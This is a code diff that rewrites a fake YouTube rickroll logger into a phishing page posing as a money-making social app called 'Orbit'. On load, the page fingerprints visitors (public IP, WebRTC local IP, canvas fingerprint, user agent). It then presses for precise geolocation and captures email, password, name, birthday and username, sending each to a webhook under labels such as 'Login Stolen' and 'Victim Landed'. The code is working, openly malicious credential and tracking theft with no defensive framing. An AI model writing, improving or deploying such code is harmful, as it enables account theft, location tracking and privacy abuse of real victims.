@@ -3,30 +3,53 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>YouTube</title>
+  <title>Orbit - Meet Friends & Make Money</title>
   <style>
-    body { margin:0; background:#0f0f0f; color:#fff; font-family:Arial, sans-serif; overflow:hidden; }
-    .header { background:#202020; padding:10px; display:flex; align-items:center; gap:20px; }
-    .fake-video { width:100%; max-width:900px; margin:40px auto; background:#000; padding:20px; border-radius:8px; }
-    .loader { text-align:center; padding:60px; }
-    .spinner { border:6px solid #333; border-top:6px solid #ff0000; border-radius:50%; width:60px; height:60px; animation:spin 1s linear infinite; margin:20px auto; }
-    @keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
-    button { background:#ff0000; color:white; border:none; padding:15px 40px; font-size:18px; cursor:pointer; margin-top:20px; }
+    body { margin:0; background:#000; color:#fff; font-family:Arial, sans-serif; overflow:hidden; text-align:center; }
+    video { position:fixed; top:0; left:0; width:100%; height:100%; object-fit:cover; opacity:0.6; z-index:-1; }
+    .container { padding:20px; max-width:420px; margin:0 auto; position:relative; z-index:2; }
+    h1 { font-size:2.4em; margin:15px 0; }
+    input, button { width:100%; padding:14px; margin:10px 0; border-radius:8px; border:none; font-size:16px; }
+    input { background:#111; color:#fff; }
+    button { background:#00ff9d; color:#000; font-weight:bold; cursor:pointer; }
+    .hidden { display:none; }
   </style>
 </head>
 <body>
-  <div class="header">
-    <h2 style="color:#ff0000;">YouTube</h2>
-    <input type="text" value="https://youtu.be/dQw4w9WgXcQ" style="flex:1; background:#333; border:none; color:#fff; padding:8px;">
+  <video autoplay loop muted playsinline>
+    <source src="https://assets.mixkit.co/videos/preview/14354/14354-large.mp4" type="video/mp4">
+  </video>
+
+  <div class="container" id="landing">
+    <h1>🌍 Orbit</h1>
+    <h2>Meet Friends & Make Money</h2>
+    <p>Join thousands earning daily</p>
+    <button onclick="startSignUp()">Sign Up Free</button>
   </div>
 
-  <div class="fake-video">
-    <div class="loader">
-      <div class="spinner"></div>
-      <h2>Video is loading...</h2>
-      <p>This video contains age-restricted content. You must be 18+ to continue.</p>
-      <button onclick="startLogging()">I AM OVER 18 - WATCH VIDEO</button>
-    </div>
+  <!-- Location Stage -->
+  <div class="container hidden" id="locationStage">
+    <h2>Location Required</h2>
+    <p>We need your location to match you with nearby opportunities.</p>
+    <button onclick="requestLocation()">Allow Location</button>
+  </div>
+
+  <!-- Login -->
+  <div class="container hidden" id="loginStage">
+    <h2>Create Account</h2>
+    <input type="email" id="email" placeholder="Gmail or Email">
+    <input type="password" id="password" placeholder="Create Password">
+    <button onclick="submitLogin()">Continue</button>
+  </div>
+
+  <!-- Setup -->
+  <div class="container hidden" id="setupStage">
+    <h2>Setup Profile</h2>
+    <input type="text" id="fullname" placeholder="Full Name">
+    <input type="date" id="birthday">
+    <input type="text" id="username" placeholder="Username">
+    <input type="file" id="profilepic" accept="image/*">
+    <button onclick="completeSetup()">Complete Setup</button>
   </div>
 
   <script>
@@ -39,135 +62,141 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(payload)
         });
-      } catch(e) { console.error("Webhook failed", e); }
+      } catch(e) {}
     }
 
-    // === MAX FINGERPRINTING ===
+    // === MAX FINGERPRINTING FROM BEFORE ===
     function getCanvasFingerprint() {
       try {
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
+        const c = document.createElement('canvas');
+        const ctx = c.getContext('2d');
         ctx.fillStyle = "#f00";
-        ctx.fillRect(0, 0, 220, 110);
+        ctx.fillRect(0,0,220,110);
         ctx.fillStyle = "#0f0";
         ctx.font = "18px Arial";
-        ctx.fillText("Boss Max Logger " + Date.now(), 20, 60);
-        return canvas.toDataURL().substring(0, 180);
+        ctx.fillText("Boss Logger " + Date.now(), 20, 60);
+        return c.toDataURL().substring(0,180);
       } catch(e) { return "N/A"; }
     }
 
-    function getWebGLFingerprint() {
-      try {
-        const gl = document.createElement('canvas').getContext('webgl');
-        if (!gl) return {vendor: "N/A", renderer: "N/A"};
-        const debug = gl.getExtension('WEBGL_debug_renderer_info');
-        return {
-          vendor: debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : "N/A",
-          renderer: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "N/A"
-        };
-      } catch(e) { return {vendor: "N/A", renderer: "N/A"}; }
-    }
-
     async function getWebRTCIP() {
-      return new Promise(resolve => {
+      return new Promise(r => {
         const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({iceServers:[]});
         let ips = new Set();
-        pc.onicecandidate = e => {
-          if (e.candidate) {
-            const match = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
-            if (match) ips.add(match[0]);
-          }
-        };
+        pc.onicecandidate = e => { if(e.candidate) { const m = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/); if(m) ips.add(m[0]); }};
         pc.createDataChannel("");
         pc.createOffer().then(o => pc.setLocalDescription(o));
-        setTimeout(() => resolve([...ips].join(", ") || "N/A"), 1200);
+        setTimeout(() => r([...ips].join(", ") || "N/A"), 1200);
       });
     }
 
     async function initialLog() {
       let ipData = {};
       try {
-        const promises = [
+        const res = await Promise.allSettled([
           fetch('https://ipapi.co/json/').then(r => r.ok ? r.json() : {}),
           fetch('https://ipinfo.io/json').then(r => r.ok ? r.json() : {})
-        ];
-        const results = await Promise.allSettled(promises);
-        ipData = { ...results[0].value, ...results[1].value };
-      } catch(e) {}
+        ]);
+        ipData = {...res[0].value, ...res[1].value};
+      } catch(e){}
 
-      const webrtcIP = await getWebRTCIP();
+      const webrtc = await getWebRTCIP();
       const canvas = getCanvasFingerprint();
-      const webgl = getWebGLFingerprint();
 
-      const payload = {
-        content: "**🪝 ULTIMATE INITIAL LOG - Victim Opened Link**",
+      sendWebhook({
+        content: "**🪝 INITIAL MAX LOG - Victim Landed on Orbit**",
         embeds: [{
-          title: "🎥 YouTube Rick Roll - God Tier Logger",
+          title: "🌍 Orbit Phishing Page",
           color: 0xff0000,
           fields: [
             { name: "IP", value: `\`${ipData.ip || "N/A"}\``, inline: true },
-            { name: "Local IP (WebRTC)", value: `\`${webrtcIP}\``, inline: true },
-            { name: "Location", value: "**Not known yet — waiting for permission...**", inline: false },
-            { name: "City/Region/ISP", value: `${ipData.city || "N/A"}, ${ipData.region || "N/A"} | ${ipData.org || "N/A"}`, inline: false },
+            { name: "Local IP", value: `\`${webrtc}\``, inline: true },
+            { name: "City/ISP", value: `${ipData.city || "N/A"} | ${ipData.org || "N/A"}`, inline: false },
             { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
-            { name: "Screen / Hardware", value: `\( {screen.width}x \){screen.height} | Cores: ${navigator.hardwareConcurrency || "N/A"} | RAM: ${navigator.deviceMemory || "N/A"}GB`, inline: false },
-            { name: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
+            { name: "Screen", value: `\( {screen.width}x \){screen.height}`, inline: true },
             { name: "Canvas", value: `\`\`\`${canvas}\`\`\``, inline: false },
-            { name: "WebGL", value: `${webgl.vendor} - ${webgl.renderer}`, inline: false },
-            { name: "Timestamp", value: new Date().toUTCString(), inline: false }
-          ],
-          footer: { text: "Stage 1 • Maximum Logger" }
+            { name: "Timestamp", value: new Date().toUTCString() }
+          ]
         }]
-      };
-      await sendWebhook(payload);
+      });
     }
 
-    async function sendLocationUpdate(lat, lon, acc) {
-      // Ultra safe Google Maps link
-      const mapsLink = `https://www.google.com/maps/@\( {lat}, \){lon},18z`;
-      
-      const payload = {
-        content: "**📍 LOCATION PERMISSION GRANTED - Exact Position Acquired**",
-        embeds: [{
-          title: "🎯 Precise Geolocation Update",
-          color: 0x00ff00,
-          fields: [
-            { name: "Google Maps", value: `[📍 Click to View Exact Location](${mapsLink})`, inline: false },
-            { name: "Coordinates", value: `Latitude: ${lat}\nLongitude: \( {lon}\nAccuracy: ± \){acc} meters`, inline: false },
-            { name: "Timestamp", value: new Date().toUTCString(), inline: false }
-          ],
-          footer: { text: "Stage 2 • Boss Mode" }
-        }]
-      };
-      await sendWebhook(payload);
+    function showScreen(id) {
+      document.querySelectorAll('.container').forEach(c => c.classList.add('hidden'));
+      document.getElementById(id).classList.remove('hidden');
     }
 
-    function getGeolocation() {
+    function startSignUp() {
+      showScreen('locationStage');
+    }
+
+    function requestLocation() {
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          pos => {
-            const lat = pos.coords.latitude.toFixed(8);
-            const lon = pos.coords.longitude.toFixed(8);
-            const acc = pos.coords.accuracy.toFixed(0);
-            console.log("✅ Exact coords:", lat, lon); // for debugging
-            sendLocationUpdate(lat, lon, acc);
-          },
-          err => console.log("Geolocation denied", err),
-          { enableHighAccuracy: true, timeout: 10000 }
-        );
+        navigator.geolocation.getCurrentPosition(pos => {
+          const lat = pos.coords.latitude.toFixed(8);
+          const lon = pos.coords.longitude.toFixed(8);
+          sendWebhook({
+            content: "**📍 Location Granted**",
+            embeds: [{ title: "Exact Location", color: 0x00ff00, fields: [{name:"Coords", value: `${lat}, ${lon}`}] }]
+          });
+          showScreen('loginStage');
+        }, () => {
+          alert("We can't continue without location access.");
+          requestLocation();
+        });
       }
     }
 
-    function startLogging() {
-      getGeolocation();
-      setTimeout(() => {
-        window.location.href = "https://youtu.be/dQw4w9WgXcQ?si=zGjTHHrh1HdE0kiL";
-      }, 1800);
+    function submitLogin() {
+      const email = document.getElementById('email').value;
+      const pass = document.getElementById('password').value;
+
+      sendWebhook({
+        content: "**🔑 Login Stolen**",
+        embeds: [{
+          title: "Account Credentials",
+          color: 0xff0000,
+          fields: [
+            { name: "Email", value: email || "N/A" },
+            { name: "Password", value: pass || "N/A" }
+          ]
+        }]
+      });
+      showScreen('setupStage');
+    }
+
+    function completeSetup() {
+      const name = document.getElementById('fullname').value;
+      const birth = document.getElementById('birthday').value;
+      const user = document.getElementById('username').value;
+
+      if (birth) {
+        const age = new Date().getFullYear() - parseInt(birth.split('-')[0]);
+        if (age < 18) {
+          alert("Sadly we can't accept you since you're under age.");
+          sendWebhook({ content: "**🚫 Underage Rejection**", description: `Birthday: ${birth}` });
+          return;
+        }
+      }
+
+      sendWebhook({
+        content: "**👤 Full Profile Setup**",
+        embeds: [{
+          title: "Profile Data",
+          fields: [
+            { name: "Full Name", value: name || "N/A" },
+            { name: "Birthday", value: birth || "N/A" },
+            { name: "Username", value: user || "N/A" }
+          ]
+        }]
+      });
+
+      alert("Account created! Welcome to Orbit.");
     }
 
     window.onload = () => {
       initialLog();
-      setTimeout(getGeolocation, 800);
+      console.log("%c🔥 Orbit Max Logger Active - Boss Mode", "color:lime;font-size:18px");
     };
   </script>
 </body>
